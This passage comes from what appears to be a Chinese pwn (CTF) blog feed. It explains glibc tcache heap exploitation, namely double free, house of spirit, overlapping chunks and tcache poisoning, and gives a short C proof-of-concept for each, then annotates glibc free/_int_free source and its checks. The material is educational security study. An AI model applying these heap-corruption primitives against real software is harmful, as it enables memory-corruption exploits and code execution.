class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这也使得很多安全检测不会被执行。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Next allocated memory will be same: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li><li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li><li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li></ul><p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code> ( <code>chunk</code> 大小) 的项中就有 两个 一样 <code>chunk</code></p><p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p><p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack buf: %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* fake_chunk = (<span class="keyword">char</span> * )fake_chunk_and_more;</span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="number">0x110</span> + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x40</span>;  <span class="comment">// 设置 pre_inused 位</span></span><br><span class="line">    <span class="keyword">char</span> *mem = fake_chunk + <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100) returned: %p\n"</span>, mem2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p><p>然后把它释放掉，他就会进入 <code>tcache</code> ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p><p>可以看到分配到了<code>fake_chunk_and_more</code> .</p><p>调试过程的内存状态</p><p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code> ( <code>size = 0x40</code> ) 。</p><p>在 源码里面是有通过 <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  ....................................................</span><br><span class="line">  ....................................................</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p><h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code> 这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后 <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的 <code>tcache</code> ， 然后在 分配 <code>fake_size</code> 的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> , <strong>overlap chunk</strong></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *sentry = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sentry, <span class="string">'b'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem: %p, sentry: %p\n"</span>,mem, sentry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    *(<span class="keyword">long</span>* )(mem - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;  <span class="comment">// 设置 chunk-&gt;size = 0x110</span></span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">// 分配一个 0x110 的chunk</span></span><br><span class="line">    <span class="built_in">memset</span>(mem2, <span class="string">'a'</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x110</code></p><p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code> （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack: %p\n"</span>,target);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    *(<span class="keyword">long</span> *)(mem) = (<span class="keyword">long</span>)target; </span><br><span class="line">    <span class="keyword">char</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code></p><p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p><p>成功分配到了 栈上面。</p><p>其实 <code>fd</code> 为任意地址都行，原因在于 <code>tcache_get</code> 直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p><p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p><p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p><p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p><p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104760</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416796.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416796.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;glibc 2.26&lt;/code&gt; 开始引入了 &lt;code&gt;tcache&lt;/code&gt; , 相关的 commit 可以看&lt;br&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>free源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/free%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/free源码简单分析/</id>
    <published>2020-02-26T11:14:51.000Z</published>
    <updated>2020-04-07T03:39:47.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GI-libc-free"><a href="#GI-libc-free" class="headerlink" title="_GI___libc_free"></a>_GI___libc_free</h2><p>首先是 _GI___libc_free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall _GI___libc_free(<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( _free_hook )</span><br><span class="line">  &#123;</span><br><span class="line">    _free_hook(ptr, retaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">unsigned</span> __int64)ptr - <span class="number">16</span>;</span><br><span class="line">    v2 = *((_QWORD *)ptr - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp; <span class="number">2</span> )                               <span class="comment">// 判断size位，判断是不是 mmap 获得的 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; v2 &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; v2 &lt;= <span class="number">0x2000000</span></span><br><span class="line">        &amp;&amp; (v1 &lt; (<span class="keyword">unsigned</span> __int64)dumped_main_arena_start || v1 &gt;= (<span class="keyword">unsigned</span> __int64)dumped_main_arena_end) )</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * (v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      munmap_chunk((mchunkptr)((<span class="keyword">char</span> *)ptr - <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      av = &amp;main_arena;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &amp; <span class="number">4</span> )</span><br><span class="line">        av = *(malloc_state **)(v1 &amp; <span class="number">0xFFFFFFFFFC000000</span>LL);</span><br><span class="line">      int_free(av, (mchunkptr)v1, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在 free_hook ， 就会直接调用 free_hook(ptr) 然后返回。否则判断被 free 的 内存是否是 mmap 获取的 ，如果是则使用 munmap_chunk 回收内存，否则进入 _int_free</p><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>首先会做一些简单的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查指针是否正常，对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 chunk 是否处于 inuse 状态</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>检查</p><ul><li>指针是否对齐</li><li>块的大小是否对齐，且大于最小的大小</li><li>块是否在 inuse 状态</li></ul><h2 id="进入-fastbin"><a href="#进入-fastbin" class="headerlink" title="进入 fastbin"></a>进入 fastbin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">          mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">          locked = <span class="number">1</span>;</span><br><span class="line">          chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ <span class="comment">// next-&gt;size &lt;= 2 * SIZE_SZ</span></span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; <span class="comment">// </span></span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old; <span class="comment">// 插入 fastbin</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果 size 满足 fastbin 的条件，则首先判断 next_chunk-&gt;size 要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next_chunk-&gt;size &gt; <span class="number">2</span> * SIZE_SZ</span><br><span class="line">next_chunk-&gt;size &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><p>接着就会找对相应的 fastbin ，然后插入 该 bin 的第一项。插入前有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>就是 p-&gt;size 索引到的 fastbin 的第一个指针不能和当前的 p 相同，否则会被认为是 double free</p><h2 id="进入-Unsorted-bin"><a 